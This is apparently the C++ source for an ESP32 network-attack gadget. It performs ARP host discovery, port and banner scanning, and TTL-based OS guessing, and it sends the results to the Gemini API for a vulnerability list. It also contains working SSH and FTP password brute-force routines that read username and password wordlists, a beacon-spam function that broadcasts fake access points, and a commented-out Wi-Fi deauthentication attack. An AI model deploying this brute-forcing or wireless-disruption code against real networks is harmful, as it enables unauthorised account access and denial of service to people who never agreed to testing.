#include <WiFi.h>
#include <config.h>
#include <ESP32Ping.h>
#include <Arduino.h>
#include <vector>
#include <cstdint>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <web_page.h>
#include <networking_tools.h>
#include "esp_task_wdt.h"
#include <IPAddress.h>
#include <lwip/raw.h>
#include <lwip/tcp.h>
#include <lwip/sockets.h>
#include <lwip/icmp.h>
#include <lwip/ip.h>
#include <lwip/inet.h>
#include <esp_log.h>
#include <cstdlib>
#include <algorithm>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <ESP32_FTPClient.h>
#include <LittleFS.h>

extern "C" {
  #include <libssh/libssh.h>
  #include <libssh/callbacks.h>
  #include <libssh/server.h>
}

extern "C" {
    #include "lwip/etharp.h"
    #include "lwip/netif.h"
    #include "esp_wifi.h"
    #include "esp_netif.h"
}

WiFiClient client;

String port_scanner(IPAddress IP) {
    // feel free to change these ports
    std::vector<int> ports = {
        20, 21, 22, 23, 25,
        53, 80, 110, 139, 143, 443,
        445, 3306, 3389, 8080, 5060
    };

    Serial.print("\nStarting port scan.");

    String json1;
    std::vector<int> opened_ports;  // Vector to store opened ports
    for (size_t i = 0; i < ports.size(); i++) {
        if (i > 0) {
            json1 += ",";
        }

        json1 += "{";
        json1 += "\"ip\":\"" + IP.toString() + "\",";
        json1 += "\"port\":" + String(ports[i]) + ",";

        WiFiClient client;
        bool open = client.connect(IP, ports[i], 150);  // 150ms timeout

        json1 += "\"open\":" + String(open ? "true" : "false");
        client.stop();

        if (open){
            opened_ports.push_back(ports[i]);  // Store opened ports
        }

        json1 += "}";

        delay(2);  // Slightly longer delay helps with socket stability
        if (i % 5 == 0){yield(); esp_task_wdt_reset();}
    }
    hosts_ports.push_back({IP, opened_ports});  // Store opened ports
    Serial.print("\nPort scan complete.");
    return json1;
}

// read IPs from ARP table because its faster than pinging each host(TCP is layer 4 of OSI model, while doing this with ARP requests takes place on 2 layer of OSI model(more low level -> faster)) 
void read_arp_table_for_ips(struct netif *iface) {
    hosts.clear();
    
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_return = nullptr;
        struct netif *entry_netif = nullptr;
        eth_addr *eth_return = nullptr;

        if (etharp_get_entry(i, &ip_return, &entry_netif, &eth_return)) {
            if (ip_return && entry_netif == iface) {
                IPAddress ip(
                    ip_return->addr & 0xFF,          // Octet 1 (LSB)
                    (ip_return->addr >> 8) & 0xFF,   // Octet 2
                    (ip_return->addr >> 16) & 0xFF,  // Octet 3
                    (ip_return->addr >> 24) & 0xFF   // Octet 4 (MSB)
                );
                
                hosts.push_back(ip);
                Serial.printf("Valid host: %d.%d.%d.%d\n",
                    ip[0], ip[1], ip[2], ip[3]);
            }
        }
    }
}

void scan_hosts_ips() {
    Serial.println("\nStarting scan_hosts_ips...");
    hosts.clear();

    // init of all the vars need
    uint32_t localIP = ntohl(WiFi.localIP());
    uint32_t gateway = ntohl(WiFi.gatewayIP());
    uint32_t subnetmask = ntohl(WiFi.subnetMask());

    uint32_t networkaddress = gateway & subnetmask;
    uint32_t broadcastaddress = networkaddress | ~subnetmask;

    // this will be needed for use of ARP on low level
    void *netif = nullptr;

    // actuall init of netif
    tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
    struct netif *net_iface = (struct netif *)netif;

    uint16_t arpRequestDelayMs = 60;
    uint16_t tableReadCounter = 0;

    Serial.println("\ninit completed");

    // checking every host on network(building ARP table)
    for (uint32_t ip_le = networkaddress + 1; ip_le < broadcastaddress; ip_le++){
        if (ip_le == localIP){continue;}

        // converting from little-endian to big-endian
        ip4_addr_t ip_be{htonl(ip_le)};

        IPAddress ip_obj(ip_le);

        err_t res = etharp_request(net_iface, &ip_be);

        // no error
        if (res == ERR_OK){
            tableReadCounter++;
        }

        // wait some time
        delay(arpRequestDelayMs);

        esp_task_wdt_reset();
    }

    // in the end we start working with ARP table
    read_arp_table_for_ips(net_iface);

    Serial.println("\nscan_hosts_ips done");
}  

void mac_from_arp() {
    Serial.print("\nExtraction MACs from ARP table started.");
    Serial.printf("\nTotal hosts to resolve: %d\n", hosts.size());
    void* netif_ptr = nullptr;
    if (tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif_ptr) != ESP_OK || netif_ptr == nullptr) return;
    struct netif* netif = static_cast<struct netif*>(netif_ptr);

    for (const auto& ip : hosts) {
        ip4_addr_t target_ip;
        uint32_t ipInt = (uint32_t(ip[3]) << 24) | (uint32_t(ip[2]) << 16) | (uint32_t(ip[1]) << 8) | uint32_t(ip[0]);
        target_ip.addr = htonl(ipInt);
        etharp_request(netif, &target_ip);
        delay(100);
    }

    discovered_hosts.clear();

    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t* ip_ret;
        struct netif* netif_ret;
        struct eth_addr* eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) && eth_ret != nullptr) {
            IPAddress found_ip(
                (ntohl(ip_ret->addr) >> 24) & 0xFF,
                (ntohl(ip_ret->addr) >> 16) & 0xFF,
                (ntohl(ip_ret->addr) >> 8) & 0xFF,
                ntohl(ip_ret->addr) & 0xFF);
            HostInfo host;
            host.ip = found_ip;
            memcpy(host.mac, eth_ret->addr, 6);
            discovered_hosts.push_back(host);
        }
    }

    Serial.println("\nDone extracting MACs from ARP table.");

    etharp_cleanup_netif(netif);
}

/*
These functions were meant for a deauth attack, but the lib dosent support using deauth frame.
If you know a way to make them work please do!

void deauth_client(std::vector<uint8_t> frame) {
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (int i = 0; i < 5; i++) {
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame.data(), frame.size(), true);
        if (result == ESP_OK) response->println("Client deauthed successfully<br>");
        else response->println("Failed to send deauth frame<br>");
    }
}

void deauth() {
    uint8_t* mac;
    for (int i = 1; i < discovered_hosts.size(); i++) {
        if (discovered_hosts[i].ip != WiFi.localIP()) {
            deauth_frame.clear();
            deauth_frame.push_back(0xC0); deauth_frame.push_back(0x00);
            deauth_frame.push_back(0x00); deauth_frame.push_back(0x00);

            mac = discovered_hosts[i].mac;
            for (int j = 0; j < 6; j++) deauth_frame.push_back(mac[j]);
            mac = discovered_hosts[0].mac;
            for (int j = 0; j < 6; j++) deauth_frame.push_back(mac[j]);
            for (int j = 0; j < 6; j++) deauth_frame.push_back(mac[j]);
            deauth_frame.push_back(0x00); deauth_frame.push_back(0x00);
            deauth_frame.push_back(0x07); deauth_frame.push_back(0x00);

            response->print("Deauthing client ");
            response->print(i);
            response->println("<br>");
            deauth_client(deauth_frame, response);
        }
        if (i % 5 == 0) yield();
    }
}
*/

void get_channel() {
    delay(400);
    int n = WiFi.scanNetworks();
    Serial.print("\nStarted updating channel.\n");
    for (int i = 0; i < n; i++) {
        if (WiFi.SSID(i) == ssid) {
            channel = WiFi.channel(i);
            break;
        }
    }
    WiFi.begin(ssid, password);
    Serial.print("\nDone updating channel.");
    while (WiFi.status() != WL_CONNECTED) delay(500);
    delay(1000);
    Serial.print("\nCurrent channel: " + (String)channel);
}

void update_mac_addresses_of_APs() {
    Serial.println("Updating MACs from discovered hosts");
    mac_addresses_of_APs.clear();
    for (const auto& host : discovered_hosts) {
        mac_addresses_of_APs.push_back(std::vector<uint8_t>(std::begin(host.mac), std::end(host.mac)));
    }
    Serial.println("MAC list updated");
}

std::array<uint8_t, 6> get_random_mac() {
    std::array<uint8_t, 6> mac;
    for (int i = 0; i < 6; ++i) {
        mac[i] = random(0, 256);
    }
    mac[0] = (mac[0] & 0xFE) | 0x02; // locally administered & unicast
    return mac;
}

void create_beacon_frame(int n) {
    beacon_frame.clear();

    // Frame Control: Beacon frame (type/subtype 0x80)
    beacon_frame.push_back(0x80);
    beacon_frame.push_back(0x00);

    // Duration
    beacon_frame.push_back(0x00);
    beacon_frame.push_back(0x00);

    // Destination: Broadcast address
    for (int i = 0; i < 6; i++) beacon_frame.push_back(0xFF);

    // Source MAC & BSSID (randomized)
    auto mac = get_random_mac();
    beacon_frame.insert(beacon_frame.end(), mac.begin(), mac.end()); // Source
    beacon_frame.insert(beacon_frame.end(), mac.begin(), mac.end()); // BSSID

    // Sequence Control
    beacon_frame.push_back(0x00);
    beacon_frame.push_back(0x00);

    // Fixed parameters
    // Timestamp (8 bytes): all zeroes
    for (int i = 0; i < 8; i++) beacon_frame.push_back(0x00);

    // Beacon Interval: 0x0064 (100 TU)
    beacon_frame.push_back(0x64);
    beacon_frame.push_back(0x00);

    // Capability Info: ESS + Privacy (bit 0 + bit 4 = 0b00000101 = 0x05)
    beacon_frame.push_back(0x05);
    beacon_frame.push_back(0x00);

    // fell free to change the name of the APs
    // SSID Tag (Element ID 0)
    String ssid_str = "Fake_AP_" + String(n);
    beacon_frame.push_back(0x00); // SSID Tag Number
    beacon_frame.push_back(ssid_str.length()); // Tag length
    for (size_t i = 0; i < ssid_str.length(); ++i) {
        beacon_frame.push_back((uint8_t)ssid_str.charAt(i));
    }

    // Supported Rates Tag (Element ID 1)
    const uint8_t supported_rates[] = {
        0x01, 0x08, // Tag ID, Length
        0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C
    };
    beacon_frame.insert(beacon_frame.end(), supported_rates, supported_rates + sizeof(supported_rates));

    // DS Parameter Set Tag (Element ID 3, Length 1, Channel)
    beacon_frame.push_back(0x03); // Tag ID
    beacon_frame.push_back(0x01); // Length
    beacon_frame.push_back(channel); // Channel number

    // TIM Tag
    const uint8_t tim_tag[] = {0x05, 0x04, 0x00, 0x01, 0x00, 0x00};
    beacon_frame.insert(beacon_frame.end(), tim_tag, tim_tag + sizeof(tim_tag));
}

void send_beacon_frame() {
    client.stop();

    WiFi.mode(WIFI_OFF);
    delay(50);
    WiFi.mode(WIFI_AP);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame.data(), beacon_frame.size(), false);
    if (err != ESP_OK) {
        Serial.println("Failed to send beacon frame: " + String(esp_err_to_name(err)));
    }
}

void beacon_spam() {
    Serial.println("=== Beacon spam started ===");

    client.stop();
    WiFi.disconnect(true);
    delay(100);

    for (size_t i = 0; i < discovered_hosts.size(); i++) {
        Serial.println("Creating beacon " + String(i));
        create_beacon_frame(i);

        for (int j = 0; j < 5; ++j) {
            send_beacon_frame();
            delay(100);  // delay between sends for better detection
        }

        Serial.println("Beacon sent");
        delay(100);
        yield();
        numAP++;
        delay(1000);  // longer delay for visibility
    }

    Serial.println("=== Beacon spam done ===");
}

// change this to change the default timeout for connect operations
int timeout = 1000; // Default timeout for connect operations

bool connect_with_timeout(WiFiClient& client, IPAddress target, int port, unsigned long timeout_ms = 300) {
    if (!client.connect(target, port)) {
        client.stop();
        return false;
    }
    unsigned long start = millis();
    while (!client.connected() && ((millis() - start) < timeout_ms)) {
        delay(10);
        yield();
        esp_task_wdt_reset();
    }
    Serial.printf("Connected to %s:%d\n", target.toString().c_str(), port);
    return client.connected();
}

bool wait_for_data(WiFiClient& client, unsigned long timeout_ms) {
    unsigned long start = millis();
    while (!client.available()) {
        if (!client.connected()) return false;  // Connection closed early
        if (millis() - start >= timeout_ms) return false;  // Timeout reached
        delay(10);
        yield();
        esp_task_wdt_reset();
    }
    return true;
}

String fetch_port_response(WiFiClient& client, int port, IPAddress target) {
    const uint32_t start = millis();
    String response;

    // HTTP/S ports
    if (port == 80 || port == 8080 || port == 443 || port == 8443 || port == 10000 || port == 5357) {
        client.print("GET / HTTP/1.1\r\nHost: " + target.toString() + "\r\nConnection: close\r\n\r\n");

        while ((millis() - start) < timeout) { // Max 1s total
            while (client.available()) {
                String line = client.readStringUntil('\n');
                line.trim();
                if (line.startsWith("Server: ")) {
                    return line.substring(8); // "Server: " is 8 chars
                }
            }
            delay(5);
            yield();
            esp_task_wdt_reset();
        }
    } 
    // Banner ports
    else {
        while ((millis() - start) < timeout) {
            if (client.available()) {
                char buf[129];
                int len = client.readBytesUntil('\n', buf, sizeof(buf)-1);
                buf[len] = 0;
                return String(buf);
            }
            delay(5);
            yield();
            esp_task_wdt_reset();
        }
    }
    return "";
}

String version_scanner(IPAddress target) {
    String versions;
    const int ports[] = {21, 22, 23, 25, 53, 80, 110, 139, 143, 161, 
                         443, 445, 8080, 8443, 10000, 5357, 8291, 2000};
    const size_t num_ports = sizeof(ports) / sizeof(ports[0]);

    for (size_t i = 0; i < num_ports; i++) {
        int port = ports[i];
        esp_task_wdt_reset(); // Reset watchdog BEFORE blocking operations
        Serial.printf("Connecting to %s:%d\n", target.toString().c_str(), port);

        if (!connect_with_timeout(client, target, port, timeout)) { // Reduced timeout
            Serial.printf("Connection to %s:%d failed.\n", target.toString().c_str(), port);
            client.stop();
            delay(5);
            continue;
        }

        Serial.println("\nClient connected.");
        // Connected - fetch banner
        String response = fetch_port_response(client, port, target);
        if (response.length() > 0) {
            versions += "Port " + String(port) + ": " + response + "\n";
        }

        client.stop();
        delay(5); // Shorter delay
        yield(); // Explicit yield
        esp_task_wdt_reset(); // Reset watchdog after each port
    }

    if (versions.isEmpty()) versions = "No services found";
    Serial.println("Scan complete:\n" + versions);
    return versions;
}

// OS detection using ICMP Echo Request (Ping)
struct icmp_echo_request {
    uint8_t type; // ICMP_ECHO
    uint8_t code; // 0
    uint16_t checksum;
    uint16_t id;
    uint16_t sequence;
    uint8_t data[64]; // Payload
};

uint16_t checksum(uint16_t *data, int len) {
    uint32_t sum = 0;
    for (; len > 1; len -= 2) {
        sum += *data++;
    }
    if (len == 1) {
        sum += *((uint8_t*)data);
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

int get_ttl_from_ping(IPAddress ip_address){
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        Serial.println("Failed to create socket");
        return 1000; // Error or no response
    }

    struct timeval timeout = {1, 0}; // 1 second timeout
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    struct sockaddr_in destinaton_addr;

    memset(&destinaton_addr, 0, sizeof(destinaton_addr));
    destinaton_addr.sin_family = AF_INET;
    destinaton_addr.sin_addr.s_addr = inet_addr((ip_address.toString().c_str()));

    // building ICMP echo request
    uint8_t packet[sizeof(struct icmp_echo_request)] = {0};
    struct icmp_echo_request *icmp = (struct icmp_echo_request *)packet;
    icmp->type = 8; // Type 8 for Echo Request
    icmp->code = 0; // Code 0
    icmp->id = htons(0x1234); // Arbitrary ID
    icmp->sequence = htons(1); // Sequence number
    icmp->checksum = checksum((uint16_t *)packet, sizeof(packet)); // Initial checksum

    // Send ICMP Echo Request
    int sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destinaton_addr, sizeof(destinaton_addr));
    if (sent < 0) {
        Serial.println("Failed to send ICMP request");
        close(sock);
        return 1000; // Error or no response
    }

    // Wait for ICMP Echo Reply
    Serial.println("Waiting for ICMP response...");
    uint8_t buffer[128];
    struct sockaddr_in source_addr;
    socklen_t source_len = sizeof(source_addr);
    int len = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&source_addr, &source_len);
    if (len > 0) {
        struct ip_hdr *ip_header = (struct ip_hdr *)buffer;
        int ttl = IPH_TTL(ip_header);
        close(sock);
        return ttl;
    }
    else {
        Serial.println("Failed to receive ICMP response");
        close(sock);
        return 1000; // Error or no response
    }
}

String detectOS(IPAddress target) {
    String os = "Unknown OS";

    int ttl = get_ttl_from_ping(target);

    Serial.printf("TTL for %s: %d\n", target.toString().c_str(), ttl);
    // OS scans do not work with TTLs above 255, so we set it to 1000
    // Its not garanteed that this OS detection will work 100% of the time (Linux sometimes has TTLs above 64, Windows can have TTLs above 128, etc.)
    if (ttl < 64 * 0.8){
        os = "Microcontroller/Embedded Device";
    } else if (ttl <= 64 * 1.2 && ttl >= 64 * 0.8) {
        os = "Linux/Microcontroller/Embedded Device";
    } else if (ttl <= 128 * 1.2 && ttl >= 128 * 0.8) {
        os = "Windows";
    } else if (ttl <= 255 * 1.2 && ttl >= 255 * 0.8) {
        os = "MacOS";
    } else {
        os = "Unknown OS";
    }

    Serial.println("Detected OS: " + os);

    return os;
}

String vuln_scanner(IPAddress target) {
    String prompt = "I have this information about host "  + target.toString() + ":\n";
    String service_and_os;
    for (const auto& host : hosts_service) {
        if (host.ip == target){
            for (const auto& service : host.service) {
                service_and_os = String(service) + " ";
            }
            break;
        }
    }
    prompt += " - these are services and the OS that this host is running: " + service_and_os + "\n";
    prompt += " - these are the open ports: ";
    for (const auto& host : hosts_ports) {
        if (host.ip == target){
            for (const auto& port : host.ports) {
                prompt += String(port) + " ";
            }
            break;
        }
    }
    prompt += "\nNow you need to list all the possible vulns(I mean like the names of those vulns). Dont ask any further questions. Your answer should be in total about 600 characters long. And also dont bold any text. Dont comment the quantity of given data.";
    prompt += "\nAll the vulns should be listed in the same way(e.g. - Eternal Blue). Also yout answer should only contain the vulns, no other text.";

    // Build JSON payload
    DynamicJsonDocument doc(2048);
    JsonArray contents = doc.createNestedArray("contents");
    JsonObject content = contents.createNestedObject();
    content["role"] = "user";
    JsonArray parts = content.createNestedArray("parts");
    JsonObject part = parts.createNestedObject();
    part["text"] = prompt;

    String requestBody;
    serializeJson(doc, requestBody);

    // Setup HTTP request
    HTTPClient http;
    String full_url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=" + API_key;
    http.begin(full_url);
    http.addHeader("Content-Type", "application/json");

    int httpResponseCode = http.POST(requestBody);

    delay(500); // Allow time for the request to complete

    esp_task_wdt_reset(); // Reset watchdog before processing response
    Serial.print("Checking if the request was successful.");
    if (httpResponseCode > 0) {
        String response = http.getString();

        // Parse JSON response
        DynamicJsonDocument responseDoc(4096);
        DeserializationError error = deserializeJson(responseDoc, response);

        if (!error) {
            const char* result = responseDoc["candidates"][0]["content"]["parts"][0]["text"];
            Serial.println("\nGemini says:");
            Serial.println(result);
            return result;
        } else {
            Serial.print("JSON parsing error: ");
            Serial.println(error.c_str());
        }

    } else {
        Serial.print("HTTP Error: ");
        Serial.println(httpResponseCode);
    }

    http.end();
    return "Failed to find vulnrabilities.";
    esp_task_wdt_reset(); // Reset watchdog after HTTP request
}

bool try_SSH_login(IPAddress target, const char* username, const char* password){
    ssh_session session = ssh_new();
    if (session == NULL) {
        Serial.println("Failed to create SSH session");
        return false;
    }
    int port = 22;
    int log_verbosity = SSH_LOG_NOLOG;

    ssh_options_set(session, SSH_OPTIONS_HOST, target.toString().c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &log_verbosity);

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    } 
    else {
        ssh_disconnect(session);
        ssh_free(session);
        return false;
    }
}

void SSHBruteforce(IPAddress target) {
    File usernames = LittleFS.open("/usernames.txt", "r");
    File passwords = LittleFS.open("/passwords.txt", "r");
    if (!usernames || !passwords) {
        Serial.println("File open failed");
        return;
    }
    SSHbruteforceResult result;
    String username, password;
    while (usernames.available()) {
        username = usernames.readStringUntil('\n');
        username.trim(); // Remove any trailing newline or spaces
        while (passwords.available()) {
            password = passwords.readStringUntil('\n');
            password.trim(); // Remove any trailing newline or spaces
            Serial.printf("Trying %s:%s on %s\n", username, password, target.toString().c_str());
            if (try_SSH_login(target, username.c_str(), password.c_str())) {
                Serial.printf("SSH login successful: %s:%s\n", username, password);
                result.ip = target;
                result.username = String(username);
                result.password = String(password);
                SSHBruteforce_results.push_back(result);
            }
            delay(100);
        }
        passwords.seek(0);
    }
    usernames.close();
    passwords.close();
    if (result.username.isEmpty() && result.password.isEmpty()) {
        result.ip = target;
        result.username = "Not found";
        result.password = "Not found";
        SSHBruteforce_results.push_back(result);
    }
}

// Helper function to convert IPAddress to char*
char* ipAddressToCharArray(IPAddress ip) {
    static char ipStr[16]; // Enough for "255.255.255.255"
    snprintf(ipStr, sizeof(ipStr), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
    return ipStr;
}

void FTPBruteforce(IPAddress target) {
    File usernames = LittleFS.open("/usernames.txt", "r");
    File passwords = LittleFS.open("/passwords.txt", "r");
    if (!usernames || !passwords) {
        Serial.println("File open failed");
        return;
    }
    Serial.printf("Starting FTP Bruteforce on %s\n", target.toString().c_str());
    FTPbruteforceResult result;

    String username, password;
    while (usernames.available()) {
        username = usernames.readStringUntil('\n');
        username.trim(); // Remove any trailing newline or spaces
         while (passwords.available()) {
            password = (passwords.readStringUntil('\n'));
            password.trim(); // Remove any trailing newline or spaces
            ESP32_FTPClient ftp(
                ipAddressToCharArray(target),
                21,
                (char*)username.c_str(),
                (char*)password.c_str(),
                1000,
                0
            );

            Serial.printf("Trying FTP login %s:%s on %s\n", username, password, target.toString().c_str());
            
            // Attempt to open connection
            ftp.OpenConnection();

            if (ftp.isConnected()) {
                ftp.ChangeWorkDir((const char*)"/");
                Serial.printf("FTP connection verified: %s:%s\n", username, password);
                result.ip = target;
                result.username = String(username);
                result.password = String(password);
                FTPBruteforce_results.push_back(result);
                ftp.CloseConnection();
            }

            ftp.CloseConnection();
            delay(100);
        }
        passwords.seek(0); // Reset passwords file to the beginning
    }
    usernames.close();
    passwords.close();

    if (result.username.isEmpty() && result.password.isEmpty()) {
        result.ip = target;
        result.username = "Not found";
        result.password = "Not found";
        FTPBruteforce_results.push_back(result);
    }

    Serial.println("FTP login failed for all credentials.");
}